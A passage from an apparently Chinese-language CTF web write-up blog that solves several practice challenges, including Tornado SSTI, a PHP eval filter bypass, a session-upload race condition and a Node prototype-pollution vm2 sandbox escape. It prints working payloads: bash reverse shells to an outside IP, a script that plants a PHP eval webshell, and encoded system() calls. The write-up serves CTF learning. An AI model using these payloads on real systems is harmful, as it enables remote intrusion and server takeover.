class="number">86400</span>*<span class="number">1000</span>, <span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">c</span>)):<span class="number">86400</span>*<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>关键点在&#x2F;getflag，它可以发送请求。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fp = <span class="string">&#x27;/app/src/flag.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> flag = <span class="title class_">Buffer</span>(<span class="number">255</span>);</span><br><span class="line"><span class="keyword">const</span> a = fs.<span class="title function_">open</span>(fp, <span class="string">&#x27;r&#x27;</span>, <span class="function">(<span class="params">err, fd</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.<span class="title function_">read</span>(fd, flag, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        fs.<span class="title function_">rm</span>(fp, <span class="function">() =&gt;</span> &#123;&#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>同时，我们注意看这里</p><p>&#x2F;app&#x2F;src&#x2F;flag.txt 文件被 open() 打开，但最终没有关闭，虽然删除了该文件，但在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。&#x2F;proc&#x2F;self&#x2F;fd 这个目录里包含了进程打开文件的情况，目录里面有一堆&#x2F;proc&#x2F;self&#x2F;fd&#x2F;id文件，id就是进程记录的打开文件的文件描述符的序号。id可爆破猜测获得。</p><p>setTimeout是使用Int32来存储延时参数值的，也就是说最大的延时值是2^31-1。 一旦超过了最大值，其效果就跟延时值为0的情况一样。数为 2147483648，即可实现延时为0。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223130449675.png" alt="image-20241223130449675"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223130528458.png" alt="image-20241223130528458"></p><h2 id="NSSCTF-2nd-MyHurricane"><a href="#NSSCTF-2nd-MyHurricane" class="headerlink" title="[NSSCTF 2nd]MyHurricane"></a>[NSSCTF 2nd]MyHurricane</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">BASE_DIR = os.path.dirname(__file__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line">    bl = [<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> bl:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> data.split():</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chunk:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">31</span> &lt; <span class="built_in">ord</span>(c) &lt; <span class="number">128</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IndexHandler</span>(tornado.web.RequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="variable language_">self</span>.finish(f.read())</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self</span>):</span><br><span class="line">        data = <span class="variable language_">self</span>.get_argument(<span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(data):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                        </span></span><br><span class="line"><span class="string">                        <span class="subst">&#123;data&#125;</span></span></span><br><span class="line"><span class="string">                        &quot;&quot;&quot;</span>)</span><br><span class="line">                f.flush()</span><br><span class="line">            <span class="variable language_">self</span>.render(<span class="string">&#x27;1.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.finish(<span class="string">&#x27;no no no&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = tornado.web.Application([</span><br><span class="line">            (<span class="string">r&quot;/&quot;</span>, IndexHandler),</span><br><span class="line">        ], compiled_template_cache=<span class="literal">False</span>)</span><br><span class="line">    app.listen(<span class="number">827</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure><p>不影响读文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssti=&#123;% extends /etc/passwd %&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223165932556.png" alt="image-20241223165932556"></p><p>这里应该直接非预期了！</p><p>正常来做，过滤了括号引号啥的，笔记了解一下</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223170940953.png" alt="image-20241223170940953"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssti=&#123;%set _tt_utf8=eval%&#125;&#123;%raw request.body_arguments[request.method][0]%&#125;&amp;POST=__import__(&#x27;os&#x27;).popen(&quot;bash -c &#x27;bash -i &gt;%26 /dev/tcp/156.238.233.113/4567 &lt;%261&#x27;&quot;)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223171201655.png" alt="image-20241223171201655"></p><p>额，虽然最后也是在环境变量里找到flag的。。。</p><h2 id="第五空间-2021-EasyCleanup"><a href="#第五空间-2021-EasyCleanup" class="headerlink" title="[第五空间 2021]EasyCleanup"></a>[第五空间 2021]EasyCleanup</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__); </span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123; </span><br><span class="line">    <span class="variable">$shell</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>] : <span class="string">&#x27;phpinfo();&#x27;</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$shell</span>) | <span class="title function_ invoke__">checkNums</span>(<span class="variable">$shell</span>)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> True; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>; </span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123; </span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>; </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">8</span>) <span class="keyword">return</span> True; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>方法看上去是有两种的，一种是想办法rce，一种是include来进行文件包含</p><p>方法一RCE：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?mode=eval&amp;shell=system(~%93%8C%DF%D0);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223172100977.png" alt="image-20241223172100977"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl /*</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?mode=eval&amp;shell=system(~%91%93%DF%D0%D5);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223172424946.png" alt="image-20241223172424946"></p><p>方法二：session条件竞争</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28547/&#x27;</span></span><br><span class="line">sessionid = <span class="string">&#x27;met&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>): <span class="comment"># 写入临时文件</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>) <span class="comment"># 50kb</span></span><br><span class="line">        session.post(url, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessionid&#125;, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php file_put_contents(&#x27;/var/www/html/shell.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);?&gt;&quot;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.jpg&#x27;</span>, fileBytes)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        session.get(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid) <span class="comment"># 进行文件包含</span></span><br><span class="line">        r = session.get(url+<span class="string">&#x27;shell.php&#x27;</span>) <span class="comment"># 检查是否写入一句话木马</span></span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line">evnet = threading.Event() <span class="comment"># 多线程</span></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    threading.Thread(target=read, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">evnet.<span class="built_in">set</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不知道为啥，没成功？！可能是环境问题吧我觉得。。。</p><h2 id="HZNUCTF-2023-final-eznode"><a href="#HZNUCTF-2023-final-eznode" class="headerlink" title="[HZNUCTF 2023 final]eznode"></a>[HZNUCTF 2023 final]eznode</h2><p>打开让我们找源码，扫个目录看看</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">VM</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> backdoor = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(&#123;&#125;.<span class="property">shellcode</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;POST some json shit to /.  no source code and try to find source code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">        <span class="keyword">var</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>));</span><br><span class="line">        <span class="keyword">var</span> copybody = <span class="title function_">clone</span>(body)</span><br><span class="line">        <span class="keyword">if</span> (copybody.<span class="property">shit</span>) &#123;</span><br><span class="line">            <span class="title function_">backdoor</span>()</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;post shit ok&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;is it shit ?&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>有个vm2啊，可能跟vm2的沙箱逃逸有关！</p><p>发现一个merge函数，原型链污染的常客，大概就是在页面post传递一个json数据，会经过json.parse函数解析，然后再通过clone()函数复制到copybody变量中，最后判断该变量的shit值是否为真，然后调用backdoor()函数在VM2沙箱中执行{}.shellcode属性。</p><p>backdoor函数利用vm2执行shellcode，这个shellcode其他地方没有得传值，所以我们利用原型链污染传递shellcode，污染成VM2沙箱逃逸的payload即可执行任意命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;shit&quot;:&quot;1&quot;,&quot;__proto__&quot;:&#123;&quot;shellcode&quot;:&quot;let res = import(&#x27;./app.js&#x27;); res.toString.constructor(&#x27;return this&#x27;)().process.mainModule.require(&#x27;child_process&#x27;).execSync(\&quot;bash -c &#x27;bash -i &gt;&amp;/dev/tcp/156.238.233.113/4567 0&gt;&amp;1&#x27;\&quot;).toString();&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241224110506682.png" alt="image-20241224110506682" style="zoom: 67%;" /><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241224110501121.png" alt="image-20241224110501121" style="zoom:67%;" /><p>拿下，当初vm2没看啊！！</p><h2 id="鹤城杯-2021-EasyP"><a href="#鹤城杯-2021-EasyP" class="headerlink" title="[鹤城杯 2021]EasyP"></a>[鹤城杯 2021]EasyP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$guess</span> === <span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28575/index.php/utils.php/%81?show[source=1</span><br></pre></td></tr></table></figure><p>​好像也可以url编码绕过？！</p><h2 id="FSCTF-2023-签到plus"><a href="#FSCTF-2023-签到plus" class="headerlink" title="[FSCTF 2023]签到plus"></a>[FSCTF 2023]签到plus</h2><p>扫源码扫到一个shell.php</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241225153946378.png" alt="image-20241225153946378" style="zoom:80%;" /><p>然后可以看到一个假的flag</p><p>去查一一下这个php版本，发现有漏洞</p><p>PHP＜&#x3D;7.4.21 Development Server源码泄露漏洞</p><p>PHP&lt;&#x3D;7.4.21时通过<code>php -S</code>开起的WEB服务器存在源码泄露漏洞，可以将PHP文件作为静态文件直接输出源码</p><p><a href="https://blog.csdn.net/weixin_46203060/article/details/129350280">https://blog.csdn.net/weixin_46203060/article/details/129350280</a></p><p><a href="https://buaq.net/go-147962.html">https://buaq.net/go-147962.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 